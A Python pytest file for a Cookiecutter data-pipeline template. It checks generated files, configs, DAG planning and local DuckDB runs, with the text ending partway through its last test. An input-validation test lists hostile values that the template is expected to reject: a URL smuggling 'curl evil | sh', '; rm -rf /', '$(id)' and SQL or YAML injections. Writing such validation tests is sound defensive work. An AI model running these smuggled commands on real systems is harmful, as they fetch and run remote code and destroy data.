"""Geração do template `template-pipeline` (tipos `ingestao`, `relatorio` e `hibrido`) e checagem dos projetos gerados."""

from __future__ import annotations

import ast
import re
from datetime import datetime, timezone
import subprocess
import sys
from collections.abc import Callable
from decimal import Decimal
from pathlib import Path

import dataeng_core
import duckdb
import pytest
import sqlglot
from cookiecutter.exceptions import FailedHookException
from dataeng_core import cli
from dataeng_core.airflow.planner import TaskSpec, plan_tasks
from dataeng_core.jobs.run_step import load_project

Bake = Callable[..., Path]
VERSION = dataeng_core.__version__
MINOR = ".".join(VERSION.split(".")[:2])
GIT_URL = "https://github.com/Talambert/tanc-portifolio.git"


def _rel(root: Path) -> set[str]:
    return {p.relative_to(root).as_posix() for p in root.rglob("*") if p.is_file()}


def _plan_dag(root: Path, config: str = "config/pipeline.yaml") -> list[TaskSpec]:
    """Planejamento das tarefas da DAG em `prod` (sem Airflow): exige, p.ex., a imagem do lote Dataproc."""
    path = root / config
    pipeline, _, _ = load_project(path, "prod", {})
    return plan_tasks(pipeline, config_path=str(path), ambiente="prod", job_config_path=config)


def _validate_and_plan(root: Path, config: str = "config/pipeline.yaml") -> None:
    for command in ("validate-config", "plan"):
        argv = [command, "--config", str(root / config), "--ambiente", "local"]
        assert cli.main(argv) == 0, f"{command} falhou em {root / config}"
    assert [t.task_id for t in _plan_dag(root, config)]


def _assert_clean(root: Path) -> None:
    """Nenhum arquivo vazio, nenhum marcador do Cookiecutter sobrando e todo .py/.sql/.yaml legível."""
    for path in root.rglob("*"):
        if not path.is_file():
            continue
        text = path.read_text(encoding="utf-8")
        rel = path.relative_to(root).as_posix()
        assert text.strip(), f"arquivo vazio: {rel}"
        assert "{{" not in text and "{%" not in text and "{#" not in text, f"marcador do Cookiecutter em {rel}"
        if path.suffix == ".py":
            ast.parse(text)


def _query(root: Path, sql: str) -> list[tuple]:
    con = duckdb.connect(str(next((root / ".local").rglob("*.duckdb"))), read_only=True)
    try:
        return con.execute(sql).fetchall()
    finally:
        con.close()


def _build_dag_call(path: Path) -> ast.Call:
    calls = [
        n
        for n in ast.walk(ast.parse(path.read_text(encoding="utf-8")))
        if isinstance(n, ast.Call) and getattr(n.func, "id", None) == "build_dag"
    ]
    assert len(calls) == 1
    return calls[0]


def _kw(call: ast.Call, name: str) -> object:
    for kw in call.keywords:
        if kw.arg == name:
            return ast.literal_eval(kw.value) if isinstance(kw.value, ast.Constant) else ast.unparse(kw.value)
    raise AssertionError(f"build_dag sem o argumento {name}")


def _run_project_tests(root: Path) -> subprocess.CompletedProcess[str]:
    return subprocess.run(
        [sys.executable, "-m", "pytest", "-q", "-p", "no:cacheprovider", "tests"],
        cwd=root,
        check=False,
        capture_output=True,
        text=True,
        timeout=240,
    )


COMMON_FILES = {
    ".dockerignore",
    ".gitignore",
    "Dockerfile",
    "README.md",
    "pyproject.toml",
    "config/pipeline.yaml",
    "config/ambientes/local.yaml",
    "config/ambientes/dev.yaml",
    "config/ambientes/prod.yaml",
    "custom/__init__.py",
    "dags/pipeline.py",
    "tests/test_config.py",
    "tests/test_local_run.py",
}
INGESTAO_ARQUIVO_FILES = COMMON_FILES | {
    "schemas/origem.yaml",
    "schemas/destino.yaml",
    "sql/ddl/silver_registros_arquivo.sql",
    "data/amostra.csv",
}
REPORT_FILES = {
    "sql/ddl/gold_agregado_por_nome.sql",
    "sql/dml/agrega_por_nome.sql",
    "sql/views/resumo_por_nome.sql",
}
RELATORIO_FILES = COMMON_FILES | REPORT_FILES | {"sql/ddl/semeia_vendas_exemplo.sql"}
PYTHON_FILES = {"custom/enriquecimento.py"}
SPARK_FILES = {"spark/recalcula.py"}


def test_ingestao_arquivo_cloud_run_generates_expected_files(bake: Bake) -> None:
    root = bake(origens="arquivo", motor_ingestao="cloud_run", modo_carga="append")
    assert _rel(root) == INGESTAO_ARQUIVO_FILES
    assert len((root / "data/amostra.csv").read_text(encoding="utf-8").splitlines()) == 6  # cabeçalho + 5
    yaml_text = (root / "config/pipeline.yaml").read_text(encoding="utf-8")
    assert "nome: meu-pipeline" in yaml_text
    assert "${bucket_bronze}" in yaml_text and "${dataset_silver}" in yaml_text  # ${} intactos
    assert "{{" not in yaml_text and "{%" not in yaml_text
    ddl = (root / "sql/ddl/silver_registros_arquivo.sql").read_text(encoding="utf-8")
    assert "${dataset_silver}.registros_arquivo" in ddl


@pytest.mark.parametrize("motor", ["cloud_run", "dataproc"])
def test_unwanted_blocks_are_removed(bake: Bake, motor: str) -> None:
    root = bake(origens="arquivo", motor_ingestao=motor)
    files = _rel(root)
    assert not any(f.startswith(("sql/views", "spark")) for f in files)
    assert not (root / "sql/views").exists() and not (root / "spark").exists()
    assert {f for f in files if f.startswith("dags/")} == {"dags/pipeline.py"}
    assert not any(f.startswith("config/pipeline_") for f in files)
    assert f"motor: {motor}" in (root / "config/pipeline.yaml").read_text(encoding="utf-8")


def test_api_origin_removes_file_blocks_and_local_run_test(bake: Bake) -> None:
    api = bake(origens="api")
    files = _rel(api)
    assert "data/amostra.csv" not in files and "schemas/origem.yaml" not in files
    assert "tests/test_local_run.py" not in files  # R3: origem api não roda local (sem rede)
    assert "tests/test_config.py" in files
    assert "sql/ddl/silver_registros_api.sql" in files
    assert "sql/ddl/silver_registros_arquivo.sql" not in files
    text = (api / "config/pipeline.yaml").read_text(encoding="utf-8")
    assert "registros_api" in text and "registros_arquivo" not in text
    both = bake(origens="arquivo,api", nome_projeto="duas-origens")
    both_files = _rel(both)
    assert {"data/amostra.csv", "schemas/origem.yaml", "sql/ddl/silver_registros_api.sql"} <= both_files
    assert "tests/test_local_run.py" not in both_files  # a origem api faria rede


def test_motor_ambos_generates_two_dags_and_two_configs(bake: Bake) -> None:
    root = bake(origens="arquivo", motor_ingestao="ambos")
    assert {f for f in _rel(root) if f.startswith(("dags/", "config/pipeline"))} == {
        "dags/pipeline_cloud_run.py",
        "dags/pipeline_dataproc.py",
        "config/pipeline.yaml",
        "config/pipeline_dataproc.yaml",
    }
    assert "motor: cloud_run" in (root / "config/pipeline.yaml").read_text(encoding="utf-8")
    dataproc = (root / "config/pipeline_dataproc.yaml").read_text(encoding="utf-8")
    assert "motor: dataproc" in dataproc and "motor: cloud_run" not in dataproc
    for engine, config in (("cloud_run", "pipeline.yaml"), ("dataproc", "pipeline_dataproc.yaml")):
        path = root / f"dags/pipeline_{engine}.py"
        call = _build_dag_call(path)
        assert _kw(call, "dag_id") == f"meu-pipeline_{engine}"
        assert _kw(call, "job_config_path") == f"config/{config}"
        assert f'"{config}"' in path.read_text(encoding="utf-8")
    _validate_and_plan(root)
    _validate_and_plan(root, "config/pipeline_dataproc.yaml")


def test_dag_passes_config_path_and_job_config_path(bake: Bake) -> None:
    root = bake(origens="arquivo")
    text = (root / "dags/pipeline.py").read_text(encoding="utf-8")
    assert "from dataeng_core.airflow.dag import build_dag" in text
    assert "import airflow" not in text and "from airflow" not in text
    call = _build_dag_call(root / "dags/pipeline.py")
    assert [ast.unparse(a) for a in call.args] == ["str(CONFIG_PATH)"]
    assert _kw(call, "job_config_path") == "config/pipeline.yaml"
    assert "__file__" in text and "dag_id" not in text  # motor único: dag_id padrão da biblioteca
    assert "ts_nodash" not in text


def test_generated_project_validates_and_plans(bake: Bake) -> None:
    root = bake(origens="arquivo,api", motor_ingestao="cloud_run", modo_carga="merge")
    _validate_and_plan(root)


def test_generated_project_runs_local_and_is_idempotent(bake: Bake) -> None:
    root = bake(origens="arquivo")
    config = str(root / "config/pipeline.yaml")
    run = ["run", "local", "--config", config, "--run-id", "20260301T060000-aaaaaa"]
    assert cli.main(run) == 0
    assert cli.main(run) == 0
    db = next((root / ".local").rglob("*.duckdb"))
    con = duckdb.connect(str(db), read_only=True)
    try:
        rows = con.execute("SELECT id, nome, valor FROM silver.registros_arquivo ORDER BY id").fetchall()
    finally:
        con.close()
    assert [r[0] for r in rows] == [1, 2, 3, 4, 5]
    assert rows[0][1] == "Alfa"
    # colunas de controle com os tipos portáteis (TIMESTAMP, não TIMESTAMPTZ): a carga as preenche
    loaded = _query(root, "SELECT DISTINCT typeof(_loaded_at), _loaded_at IS NOT NULL, typeof(_ingestion_date) FROM silver.registros_arquivo")
    assert loaded == [("TIMESTAMP", True, "DATE")]
    (stamp,) = _query(root, "SELECT max(_loaded_at) FROM silver.registros_arquivo")[0]
    assert abs((datetime.now(timezone.utc).replace(tzinfo=None) - stamp).total_seconds()) < 300  # UTC, sem deslocamento de fuso


def test_generated_project_own_tests_pass(bake: Bake) -> None:
    root = bake(origens="arquivo")
    proc = _run_project_tests(root)
    assert proc.returncode == 0, proc.stdout + proc.stderr
    assert "passed" in proc.stdout


def test_generated_api_project_own_tests_pass(bake: Bake) -> None:
    root = bake(origens="api", motor_ingestao="dataproc")
    proc = _run_project_tests(root)
    assert proc.returncode == 0, proc.stdout + proc.stderr


def test_origem_da_biblioteca_changes_the_dependency_line(bake: Bake) -> None:
    git = bake(origem_da_biblioteca="git")
    text = (git / "pyproject.toml").read_text(encoding="utf-8")
    assert f'"dataeng-core[local] @ git+{GIT_URL}@dataeng-core-v{VERSION}#subdirectory=lib-dataeng-core"' in text
    assert "extra-index-url" not in text
    custom = bake(origem_da_biblioteca="git", repositorio_biblioteca="https://example.org/org/repo.git")
    custom_text = (custom / "pyproject.toml").read_text(encoding="utf-8")
    assert "git+https://example.org/org/repo.git@dataeng-core-v" in custom_text
    registry = bake(origem_da_biblioteca="artifact_registry", indice_artifact_registry="https://idx.example/simple/")
    text = (registry / "pyproject.toml").read_text(encoding="utf-8")
    assert f'"dataeng-core[local]=={MINOR}.*"' in text
    assert "git+" not in text
    reqs = (registry / "requirements.txt").read_text(encoding="utf-8").splitlines()
    assert "--extra-index-url https://idx.example/simple/" in reqs
    assert f"dataeng-core[local]=={MINOR}.*" in reqs
    assert not (git / "requirements.txt").exists()


def test_dockerfile_installs_pinned_library_and_sets_entrypoint(bake: Bake) -> None:
    entry = 'ENTRYPOINT ["python", "-m", "dataeng_core.jobs.run_step"]'
    git = (bake(origem_da_biblioteca="git") / "Dockerfile").read_text(encoding="utf-8").splitlines()
    assert entry in git
    install = [line for line in git if "dataeng-core" in line and "pip install" in line]
    assert len(install) == 1
    assert f'"dataeng-core[gcp] @ git+{GIT_URL}@dataeng-core-v{VERSION}#subdirectory=lib-dataeng-core"' in install[0]
    assert any("apt-get install" in line and "git" in line for line in git)
    assert any(line.startswith("USER ") and "root" not in line for line in git)
    registry = bake(origem_da_biblioteca="artifact_registry", indice_artifact_registry="https://idx.example/simple/")
    lines = (registry / "Dockerfile").read_text(encoding="utf-8").splitlines()
    assert entry in lines
    install = [line for line in lines if "dataeng-core" in line and "pip install" in line]
    assert len(install) == 1
    assert "--extra-index-url https://idx.example/simple/" in install[0]
    assert f'"dataeng-core[gcp]=={MINOR}.*"' in install[0]
    assert not any("apt-get" in line for line in lines)
    assert "COPY config/ config/" in lines and "WORKDIR /app" in lines


def test_environments_use_fictitious_values_and_api_uses_secret_env_name(bake: Bake) -> None:
    root = bake(origens="arquivo,api")
    envs = {n: (root / f"config/ambientes/{n}.yaml").read_text(encoding="utf-8") for n in ("local", "dev", "prod")}
    assert "projeto_gcp: meu-projeto-dev" in envs["dev"] and "projeto_gcp: meu-projeto-prod" in envs["prod"]
    assert "modo: local" in envs["local"] and "modo: gcp" in envs["dev"]
    yaml_text = (root / "config/pipeline.yaml").read_text(encoding="utf-8")
    assert "segredo_env: API_TOKEN" in yaml_text


# Amostra do produto origem x motor x modo (36 geracoes levariam ~36 s): cada par origem x motor aparece uma vez e o
# modo de carga gira, de modo que cada origem e cada motor vê os três modos.
_ORIGENS = ["arquivo", "api", "pubsub", "arquivo,pubsub"]
_MOTORES = ["cloud_run", "dataproc", "ambos"]
_MODOS = ["append", "overwrite_particao", "merge"]
MATRIX = [(o, m, _MODOS[(i + j) % 3]) for i, o in enumerate(_ORIGENS) for j, m in enumerate(_MOTORES)]


@pytest.mark.parametrize(("origem", "motor", "modo"), MATRIX)
def test_matrix_origem_motor_modo_carga(bake: Bake, origem: str, motor: str, modo: str) -> None:
    root = bake(origens=origem, motor_ingestao=motor, modo_carga=modo)
    _validate_and_plan(root)
    if motor == "ambos":
        _validate_and_plan(root, "config/pipeline_dataproc.yaml")
    text = (root / "config/pipeline.yaml").read_text(encoding="utf-8")
    origens = origem.split(",")
    if origens != ["pubsub"]:
        assert f"modo_carga: {modo}" in text
    assert ("chaves_merge: [id]" in text) == (modo == "merge" and origens != ["pubsub"])
    if "pubsub" in origens:
        # pubsub não aceita overwrite_particao: append (merge por message_id) ou merge por message_id
        assert "tipo: pubsub" in text and "dedupe_por: message_id" in text
        assert ("chaves_merge: [message_id]" in text) == (modo == "merge")
        assert ("modo_carga: merge" if modo == "merge" else "modo_carga: append") in text


def test_pubsub_origin_generates_its_blocks_and_local_run_test(bake: Bake) -> None:
    root = bake(origens="pubsub")
    files = _rel(root)
    assert {"schemas/origem_eventos.yaml", "schemas/destino_eventos.yaml", "sql/ddl/silver_eventos.sql"} <= files
    assert "data/amostra.csv" not in files and "schemas/origem.yaml" not in files
    assert "sql/ddl/silver_registros_arquivo.sql" not in files and "sql/ddl/silver_registros_api.sql" not in files
    assert "tests/test_local_run.py" in files  # pubsub roda local com o LocalPubSub
    text = (root / "config/pipeline.yaml").read_text(encoding="utf-8")
    assert 'assinatura: "projects/${projeto_gcp}/subscriptions/eventos-sub"' in text
    assert "registros_arquivo" not in text and "registros_api" not in text
    assert "message_id" in (root / "schemas/destino_eventos.yaml").read_text(encoding="utf-8")
    both = _rel(bake(origens="arquivo,pubsub", nome_projeto="arquivo-e-eventos"))
    assert {"data/amostra.csv", "schemas/origem.yaml", "schemas/destino_eventos.yaml", "tests/test_local_run.py"} <= both
    without = _rel(bake(origens="arquivo", nome_projeto="sem-eventos"))
    assert not any("eventos" in f for f in without)
    with_api = _rel(bake(origens="api,pubsub", nome_projeto="api-e-eventos"))
    assert "tests/test_local_run.py" not in with_api  # a origem api faria rede


def test_generated_pubsub_project_runs_local_with_empty_queue(bake: Bake) -> None:
    root = bake(origens="pubsub")
    run = ["run", "local", "--config", str(root / "config/pipeline.yaml"), "--run-id", "20260301T060000-aaaaaa"]
    assert cli.main(run) == 0  # fila local vazia: ok com 0 linhas (limitação documentada no README)
    db = next((root / ".local").rglob("*.duckdb"))
    con = duckdb.connect(str(db), read_only=True)
    try:
        control = con.execute("SELECT etapa, status, linhas_lidas, backlog FROM silver._controle_execucoes").fetchall()
    finally:
        con.close()
    assert control == [("ingere_eventos", "ok", 0, 0)]


@pytest.mark.parametrize("origens", ["pubsub", "arquivo,pubsub"])
def test_generated_pubsub_project_own_tests_pass(bake: Bake, origens: str) -> None:
    root = bake(origens=origens, modo_carga="merge")
    proc = _run_project_tests(root)
    assert proc.returncode == 0, proc.stdout + proc.stderr
    # 5 de configuração (configs, validate-config, plan, planejamento da DAG, DAG estática) + run local + LocalPubSub
    assert "7 passed" in proc.stdout, proc.stdout
    assert "skipped" not in proc.stdout


INVALID = [
    ("origens", "pubsub,kafka", "desconhecida"),
    ("origens", "", "origens"),
    ("origens", "arquivo,arquivo", "repetidas"),
    ("origens", 'arq"uivo', "desconhecida"),
    ("origens", "arq" + chr(92) + "uivo\nx", "desconhecida"),
    ("nome_projeto", "nome inválido!", "formato esperado"),
    ("agenda_cron", '0 6 * * 1" \n  injected: x', "formato esperado"),
    ("agenda_cron", "0 6 * *", "formato esperado"),
    ("agenda_cron", "@whenever", "formato esperado"),
    ("__tabela_base", "x; DROP TABLE y", "formato esperado"),
    ("__tabela_base", 'a"""' + chr(10) + 'import os', "formato esperado"),
    ("projeto_gcp", "a: b\nfoo: bar", "formato esperado"),
    ("projeto_gcp", "Meu_Projeto", "formato esperado"),
    ("regiao", "sao paulo", "formato esperado"),
    ("bucket_bronze", 'x"y', "formato esperado"),
    ("bucket_bronze", "AB", "formato esperado"),
    ("dataset_silver", "my-silver", "formato esperado"),
    ("dataset_gold", "1gold", "formato esperado"),
    ("versao_biblioteca", "abc", "formato esperado"),
    ("versao_biblioteca", "1", "formato esperado"),
    ("repositorio_biblioteca", 'https://x" && curl evil | sh #', "formato esperado"),
    ("repositorio_biblioteca", "http://github.com/o/r.git", "formato esperado"),
    ("indice_artifact_registry", "https://x/simple/; rm -rf /", "formato esperado"),
    ("indice_artifact_registry", "https://x/$(id)", "formato esperado"),
]


@pytest.mark.parametrize(("variavel", "valor", "trecho"), INVALID)
def test_invalid_answers_fail_in_pre_gen_naming_the_variable(
    bake: Bake, capfd: pytest.CaptureFixture[str], variavel: str, valor: str, trecho: str
) -> None:
    with pytest.raises(FailedHookException):
        bake(**{variavel: valor})
    err = capfd.readouterr().err
    assert "ERRO ao gerar o projeto" in err
    assert variavel in err and trecho in err
    assert "SyntaxError" not in err and "Traceback" not in err


def test_valid_alternative_answers_are_accepted(bake: Bake) -> None:
    root = bake(agenda_cron="@daily", regiao="us-central1", dataset_silver="_silver2", versao_biblioteca="1.12.3")
    assert 'agenda: "@daily"' in (root / "config/pipeline.yaml").read_text(encoding="utf-8")


@pytest.mark.parametrize(
    ("variavel", "valor"),
    [
        ("tipo_projeto", "streaming"),
        ("motor_ingestao", "spark"),
        ("modo_carga", "upsert"),
        ("origem_da_biblioteca", "pip"),
        ("usa_python", "talvez"),
        ("usa_spark", "true"),
    ],
)
def test_choice_variables_reject_unknown_values(bake: Bake, variavel: str, valor: str) -> None:
    """Variáveis de escolha são recusadas pelo próprio Cookiecutter, antes de qualquer arquivo ser gerado."""
    with pytest.raises(ValueError, match=variavel):
        bake(**{variavel: valor})


# ---------------------------------------------------------------------------------------------------------------
# Tipos `relatorio` e `hibrido`
# ---------------------------------------------------------------------------------------------------------------
FLAGS = [("nao", "nao"), ("sim", "nao"), ("nao", "sim"), ("sim", "sim")]
RUN = "20260301T060000-aaaaaa"


def _step_kinds(root: Path, config: str = "config/pipeline.yaml") -> dict[str, str]:
    return {t.task_id: t.kind for t in _plan_dag(root, config)}


def test_relatorio_has_no_origin_schemas(bake: Bake) -> None:
    root = bake(tipo_projeto="relatorio")
    files = _rel(root)
    assert files == RELATORIO_FILES
    assert not (root / "schemas").exists() and not (root / "data").exists() and not (root / "spark").exists()
    assert not any(f.startswith("schemas/") or "silver_" in f for f in files)
    text = (root / "config/pipeline.yaml").read_text(encoding="utf-8")
    assert "tipo: ingestao" not in text and "origem:" not in text and "schema:" not in text
    assert "${dataset_silver}.vendas_exemplo" in (root / "sql/ddl/semeia_vendas_exemplo.sql").read_text(encoding="utf-8")
    dockerfile = (root / "Dockerfile").read_text(encoding="utf-8")
    assert "COPY schemas/" not in dockerfile and "COPY data/" not in dockerfile
    _assert_clean(root)


@pytest.mark.parametrize("motor", ["dataproc", "ambos"])
def test_relatorio_ignores_origin_and_ingestion_engine_variables(bake: Bake, motor: str) -> None:
    """Variáveis de ingestão não têm efeito no relatorio: nenhum arquivo extra, uma só DAG, nenhuma etapa de origem."""
    baseline = bake(tipo_projeto="relatorio", nome_projeto="base")
    other = bake(
        tipo_projeto="relatorio",
        origens="arquivo,api,pubsub",
        motor_ingestao=motor,
        modo_carga="merge",
        nome_projeto="base2",
    )
    assert _rel(other) == _rel(baseline) == RELATORIO_FILES
    assert _step_kinds(other) == {
        "semeia_dados": "bigquery_job",
        "view_resumo_por_nome": "bigquery_job",
        "agrega_por_nome": "bigquery_job",
        "checagem_final": "cloud_run_job",
    }
    dag = (other / "dags/pipeline.py").read_text(encoding="utf-8")
    assert "dag_id" not in dag and '"pipeline.yaml"' in dag
    assert "dataproc" not in (other / "config/pipeline.yaml").read_text(encoding="utf-8")


@pytest.mark.parametrize("flags", FLAGS, ids=lambda f: f"py_{f[0]}-spark_{f[1]}")
def test_ingestao_ignores_python_and_spark_flags(bake: Bake, flags: tuple[str, str]) -> None:
    root = bake(origens="arquivo", usa_python=flags[0], usa_spark=flags[1])
    assert _rel(root) == INGESTAO_ARQUIVO_FILES
    text = (root / "config/pipeline.yaml").read_text(encoding="utf-8")
    assert "tipo: python" not in text and "tipo: spark" not in text and "dataproc" not in text


def test_hibrido_generates_everything(bake: Bake) -> None:
    root = bake(tipo_projeto="hibrido", origens="arquivo,pubsub", usa_python="sim", usa_spark="sim", modo_carga="merge")
    files = _rel(root)
    assert files == (
        INGESTAO_ARQUIVO_FILES
        | REPORT_FILES
        | PYTHON_FILES
        | SPARK_FILES
        | {"schemas/origem_eventos.yaml", "schemas/destino_eventos.yaml", "sql/ddl/silver_eventos.sql"}
    )
    text = (root / "config/pipeline.yaml").read_text(encoding="utf-8")
    ids = [line.split(":", 1)[1].strip() for line in text.splitlines() if line.startswith("  - id:")]
    assert ids == [
        "ingere_arquivo",
        "ingere_eventos",
        "garante_tabela_base",
        "view_resumo_por_nome",
        "agrega_por_nome",
        "enriquece",
        "checagem_final",
        "recalcula_spark",
    ]
    assert text.count("depende_de: [ingere_arquivo, ingere_eventos]") == 1  # a tabela base espera toda a ingestão
    assert text.count("depende_de: [garante_tabela_base]") == 2  # e a view e o MERGE esperam a tabela base
    assert "sql: [sql/ddl/silver_registros_arquivo.sql]" in text
    assert "semeia_dados" not in text and "semeia_vendas_exemplo" not in "".join(files)
    # a tabela base do relatório é a da primeira origem de arquivo; ${} intactos
    assert "${dataset_silver}.registros_arquivo" in (root / "sql/views/resumo_por_nome.sql").read_text(encoding="utf-8")
    assert "${dataset_silver}.registros_arquivo" in (root / "sql/dml/agrega_por_nome.sql").read_text(encoding="utf-8")
    _assert_clean(root)
    _validate_and_plan(root)
    assert _step_kinds(root) == {
        "ingere_arquivo": "cloud_run_job",
        "ingere_eventos": "cloud_run_job",
        "garante_tabela_base": "bigquery_job",
        "view_resumo_por_nome": "bigquery_job",
        "agrega_por_nome": "bigquery_job",
        "enriquece": "cloud_run_job",
        "checagem_final": "cloud_run_job",  # `qualidade` roda sempre no Cloud Run
        "recalcula_spark": "dataproc_batch",
    }


@pytest.mark.parametrize(
    ("origens", "tabela"),
    [("arquivo", "registros_arquivo"), ("api", "registros_api"), ("pubsub", "eventos"), ("pubsub,api", "registros_api")],
)
def test_hibrido_report_reads_the_first_available_origin_table(bake: Bake, origens: str, tabela: str) -> None:
    root = bake(tipo_projeto="hibrido", origens=origens)
    assert f"${{dataset_silver}}.{tabela}" in (root / "sql/views/resumo_por_nome.sql").read_text(encoding="utf-8")
    assert f"FROM ${{dataset_silver}}.{tabela}\n" in (root / "sql/dml/agrega_por_nome.sql").read_text(encoding="utf-8")
    _validate_and_plan(root)
    _assert_clean(root)


def test_hibrido_motor_ambos_generates_two_dags_with_the_whole_pipeline(bake: Bake) -> None:
    root = bake(tipo_projeto="hibrido", origens="arquivo", motor_ingestao="ambos", usa_python="sim", usa_spark="sim")
    files = _rel(root)
    assert {"dags/pipeline_cloud_run.py", "dags/pipeline_dataproc.py", "config/pipeline_dataproc.yaml"} <= files
    assert "dags/pipeline.py" not in files
    cloud = (root / "config/pipeline.yaml").read_text(encoding="utf-8")
    dataproc = (root / "config/pipeline_dataproc.yaml").read_text(encoding="utf-8")
    assert "motor: cloud_run" in cloud and "motor: dataproc" not in cloud
    assert "motor: dataproc" in dataproc and "motor: cloud_run" not in dataproc
    # as duas DAGs levam o relatório inteiro; só o motor da ingestão muda
    assert dataproc.replace("motor: dataproc", "motor: cloud_run") == cloud
    for engine, config in (("cloud_run", "pipeline.yaml"), ("dataproc", "pipeline_dataproc.yaml")):
        call = _build_dag_call(root / f"dags/pipeline_{engine}.py")
        assert _kw(call, "dag_id") == f"meu-pipeline_{engine}"
        assert _kw(call, "job_config_path") == f"config/{config}"
        _validate_and_plan(root, f"config/{config}")
    assert _step_kinds(root)["ingere_arquivo"] == "cloud_run_job"
    kinds = _step_kinds(root, "config/pipeline_dataproc.yaml")
    assert kinds["ingere_arquivo"] == "dataproc_batch" and kinds["view_resumo_por_nome"] == "bigquery_job"
    assert kinds["checagem_final"] == "cloud_run_job" and kinds["recalcula_spark"] == "dataproc_batch"
    tasks = {t.task_id: t for t in _plan_dag(root, "config/pipeline_dataproc.yaml")}
    assert "container_image" in tasks["ingere_arquivo"].resources  # exigida pelo planejador (exemplo a trocar)
    assert tasks["recalcula_spark"].resources["main_python_file_uri"].endswith("/spark/recalcula.py")
    _assert_clean(root)


@pytest.mark.parametrize("tipo", ["ingestao", "relatorio", "hibrido"])
@pytest.mark.parametrize("flags", FLAGS, ids=lambda f: f"py_{f[0]}-spark_{f[1]}")
def test_matrix_tipo_python_spark(bake: Bake, tipo: str, flags: tuple[str, str]) -> None:
    root = bake(tipo_projeto=tipo, usa_python=flags[0], usa_spark=flags[1])
    files = _rel(root)
    has_report = tipo != "ingestao"
    assert ("custom/enriquecimento.py" in files) == (has_report and flags[0] == "sim")
    assert ("spark/recalcula.py" in files) == (has_report and flags[1] == "sim")
    assert ("sql/views/resumo_por_nome.sql" in files) == has_report
    assert ("sql/dml/agrega_por_nome.sql" in files) == has_report
    assert ("schemas/destino.yaml" in files) == (tipo != "relatorio")
    assert ("sql/ddl/semeia_vendas_exemplo.sql" in files) == (tipo == "relatorio")
    text = (root / "config/pipeline.yaml").read_text(encoding="utf-8")
    assert ("tipo: python" in text) == (has_report and flags[0] == "sim")
    assert ("tipo: spark" in text) == (has_report and flags[1] == "sim")
    assert ("tipo: view" in text) == has_report
    assert ("tipo: qualidade" in text) == has_report
    assert ("tipo: ingestao" in text) == (tipo != "relatorio")
    _assert_clean(root)
    _validate_and_plan(root)


def _ingestion_ids(origens: str) -> list[str]:
    ids = {"arquivo": "ingere_arquivo", "api": "ingere_api", "pubsub": "ingere_eventos"}
    return [ids[o] for o in ("arquivo", "api", "pubsub") if o in origens.split(",")]


@pytest.mark.parametrize(
    ("origens", "motor", "modo"),
    [
        ("arquivo", "cloud_run", "append"),
        ("api", "dataproc", "merge"),
        ("pubsub", "ambos", "overwrite_particao"),
        ("arquivo,pubsub", "ambos", "merge"),
        ("arquivo,api,pubsub", "dataproc", "overwrite_particao"),
    ],
)
def test_matrix_hibrido_origem_motor_modo_carga(bake: Bake, origens: str, motor: str, modo: str) -> None:
    """Amostra representativa (cada valor de cada eixo aparece; o produto cartesiano levaria minutos)."""
    root = bake(tipo_projeto="hibrido", origens=origens, motor_ingestao=motor, modo_carga=modo, usa_python="sim")
    _validate_and_plan(root)
    if motor == "ambos":
        _validate_and_plan(root, "config/pipeline_dataproc.yaml")
    _assert_clean(root)
    tasks = {t.task_id: t for t in _plan_dag(root)}
    assert tasks["garante_tabela_base"].depends_on == _ingestion_ids(origens)
    for step in ("view_resumo_por_nome", "agrega_por_nome"):
        assert tasks[step].depends_on == ["garante_tabela_base"]
    assert tasks["enriquece"].depends_on == ["agrega_por_nome"]
    assert tasks["checagem_final"].depends_on == ["view_resumo_por_nome", "agrega_por_nome", "enriquece"]
    assert ("tests/test_local_run.py" in _rel(root)) == ("api" not in origens)  # R3: api faria rede


def test_generated_relatorio_runs_local(bake: Bake) -> None:
    """View e MERGE sobre os dados semeados: o conteúdo (não só o código de saída) e a idempotência."""
    root = bake(tipo_projeto="relatorio", usa_python="sim")
    argv = ["run", "local", "--config", str(root / "config/pipeline.yaml"), "--run-id", RUN]
    resumo = [
        ("Alfa", 2, Decimal("15.00")),
        ("Beta", 2, Decimal("25.00")),
        ("Delta", 1, Decimal("3.10")),
        ("Gama", 1, Decimal("7.25")),
    ]
    for _ in range(2):  # a 2ª rodada, com o mesmo run_id, deixa tudo igual
        assert cli.main(argv) == 0
        assert _query(root, "SELECT id, nome, valor FROM silver.vendas_exemplo ORDER BY id") == [
            (1, "Alfa", Decimal("10.50")),
            (2, "Alfa", Decimal("4.50")),
            (3, "Beta", Decimal("20.00")),
            (4, "Beta", Decimal("5.00")),
            (5, "Gama", Decimal("7.25")),
            (6, "Delta", Decimal("3.10")),
        ]
        assert _query(root, "SELECT nome, qtd, total FROM gold.resumo_por_nome ORDER BY nome") == resumo
        assert _query(root, "SELECT nome, qtd, total FROM gold.agregado_por_nome ORDER BY nome") == resumo
        assert _query(root, "SELECT nome, total, classe FROM gold.agregado_classificado ORDER BY nome") == [
            ("Alfa", Decimal("15.00"), "alto"),
            ("Beta", Decimal("25.00"), "alto"),
            ("Delta", Decimal("3.10"), "baixo"),
            ("Gama", Decimal("7.25"), "baixo"),
        ]
    steps = ["semeia_dados", "view_resumo_por_nome", "agrega_por_nome", "enriquece", "checagem_final"]
    control = _query(root, "SELECT etapa, status FROM silver._controle_execucoes ORDER BY registrado_em")
    assert control == [(s, "ok") for s in steps] * 2  # uma linha por etapa por execução


def test_merge_in_relatorio_updates_instead_of_duplicating(bake: Bake) -> None:
    """Muda a fonte entre as rodadas: a view acompanha e o MERGE atualiza a linha existente."""
    root = bake(tipo_projeto="relatorio")
    config = str(root / "config/pipeline.yaml")
    assert cli.main(["run", "local", "--config", config, "--run-id", RUN]) == 0
    seed = root / "sql/ddl/semeia_vendas_exemplo.sql"
    text = seed.read_text(encoding="utf-8")
    assert text.count("'Alfa', CAST(4.50") == 1
    seed.write_text(text.replace("'Alfa', CAST(4.50", "'Alfa', CAST(9.50"), encoding="utf-8")
    assert cli.main(["run", "local", "--config", config, "--run-id", "20260302T060000-bbbbbb"]) == 0
    expected = [
        ("Alfa", 2, Decimal("20.00")),
        ("Beta", 2, Decimal("25.00")),
        ("Delta", 1, Decimal("3.10")),
        ("Gama", 1, Decimal("7.25")),
    ]
    assert _query(root, "SELECT nome, qtd, total FROM gold.resumo_por_nome ORDER BY nome") == expected
    assert _query(root, "SELECT nome, qtd, total FROM gold.agregado_por_nome ORDER BY nome") == expected


def test_generated_hibrido_runs_local_report_over_the_ingested_sample(bake: Bake) -> None:
    root = bake(tipo_projeto="hibrido", origens="arquivo", usa_python="sim")
